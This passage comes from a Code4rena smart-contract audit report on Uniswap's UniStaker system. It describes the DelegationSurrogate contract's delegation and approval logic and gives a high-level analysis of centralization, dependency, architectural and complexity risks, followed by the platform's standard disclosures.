- **Token Delegation**: The constructor takes two arguments: a governance token (`_token`) and a delegatee (`_delegatee`). It immediately delegates the voting power of any governance tokens that will be held by this contract to the specified delegatee. This delegation is crucial for ensuring that the voting power associated with pooled tokens is not lost and can be exercised according to the preferences of the token holders.
- **Token Approval for Reclaiming**: In addition to delegating voting power, the constructor sets up an approval, allowing the deployer of the contract (most likely a staking pool or another contract pooling governance tokens) to reclaim the tokens without requiring further permissions. This is done by approving the maximum possible amount of tokens (`type(uint256).max`), ensuring that the deployer can manage the tokens as needed without additional transaction overhead.

**Operational Context**

- **Maintaining Governance Rights**: The contract serves to ensure that token holders who contribute their tokens to a pool still have their preferences represented in governance decisions. By delegating the voting power of pooled tokens to chosen delegatees, it ensures that the governance influence of individual token holders is preserved.
- **Simplifying Token Management**: By approving the contract deployer to manage the tokens, the `DelegationSurrogate` simplifies the administrative aspect of token pooling. This setup allows for the efficient handling of tokens, enabling their movement without requiring individual approval transactions for each action.

**Security and Permissions**

- **Immutable Delegation and Approval**: The actions taken by the constructor - delegating voting power and setting token approval - are performed at the time of contract deployment and cannot be altered afterward. This design choice simplifies the contract's operation and enhances its security by reducing the surface area for potential malicious actions or mistakes after deployment.

**Use Cases**

- **Staking Pools and Governance**: The `DelegationSurrogate` is particularly useful in the context of staking pools or other mechanisms where governance tokens are pooled. It allows these structures to maintain the governance participation rights of their contributors, ensuring that the aggregation of tokens does not dilute individual governance influence.
- **Token Management Efficiency**: For contracts that manage pooled governance tokens on behalf of users, the `DelegationSurrogate` offers an efficient way to handle these tokens, particularly for operations like reallocating tokens back to users or moving them based on the pool's needs.

### Summary

The `DelegationSurrogate` contract is a streamlined solution designed to preserve the governance rights of token holders within pooled environments. Through its straightforward mechanism of delegating voting power and setting up token approvals at deployment, it ensures that governance participation remains effective and that token management remains efficient.

*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2024-02-uniswap-foundation-findings/issues/312).*

## Centralization Risks

**Admin Control and Privileged Actions**: A significant centralization risk arises from the extensive control and privileged actions that an admin can perform, such as updating admin addresses, setting payout amounts, enabling or disabling reward notifiers, and other administrative functions. This centralized control could lead to potential misuse or abuse if the admin keys are compromised or if the admin acts maliciously.

**DelegationSurrogate and Voting Power**: The use of `DelegationSurrogate` to delegate voting power centralizes the governance influence in the hands of a few, potentially skewing governance decisions. Although it aims to empower token holders, the actual implementation could lead to centralization of voting power, especially if surrogate contracts are managed or influenced by a small group.

## Systematic Risks

**Dependency on External Contracts and Interfaces**: The system's reliance on external contracts and interfaces like `IUniswapV3PoolOwnerActions`, `IUniswapV3FactoryOwnerActions`, and `IERC20` introduces systematic risks. Changes or vulnerabilities in these external contracts could adversely affect the functionality and security of the system.

**Reward Distribution Mechanism**: The reward distribution mechanism, based on the notification of new rewards and the calculation of distributed rewards, introduces a risk of manipulation or errors in reward calculations. This could lead to loss of funds or unfair distribution of rewards, impacting the integrity of the staking and reward system.

## Architectural Risks

**Upgradability and Flexibility**: The contracts' architecture does not explicitly address upgradability or the ability to adapt to future requirements or fixes. This rigidity could lead to challenges in responding to discovered vulnerabilities, evolving governance models, or integrating with new protocols and standards.

**Inter-contract Communication**: The architecture involves multiple contracts interacting with each other, such as the delegation of voting power through `DelegationSurrogate` and the management of rewards in `UniStaker`. This interdependency increases the complexity and the risk of unintended consequences due to errors in communication or execution logic between contracts.

## Complexity Risks

**Contract Complexity and Interactions**: The contracts exhibit a high degree of complexity, particularly in the management of staking, delegation, and rewards distribution. This complexity increases the risk of bugs or vulnerabilities remaining undetected despite testing and audits.

**Understanding and Participation Barrier**: The complexity of contract interactions and the governance model may pose a barrier to understanding for potential users and participants. This could lead to lower participation in governance or staking, affecting the decentralization and security of the system.

In summary, while the system introduces innovative mechanisms for staking, delegation, and rewards distribution, it also presents centralization, systematic, architectural, and complexity risks that should be carefully managed and mitigated through rigorous security practices, audits, and potentially introducing more decentralized governance mechanisms over time.

### Conclusion

The UniStaker system presents an innovative approach to staking, voting delegation, and rewards distribution within the DeFi ecosystem. While it offers significant benefits in terms of governance participation and incentive mechanisms, it also carries risks related to centralization, system dependencies, architectural rigidity, and operational complexity. Addressing these concerns through continuous audits, enhancing decentralization, and simplifying user interactions will be crucial for.

### Time spent

28 hours

***

# Disclosures

C4 is an open organization governed by participants in the community.

C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.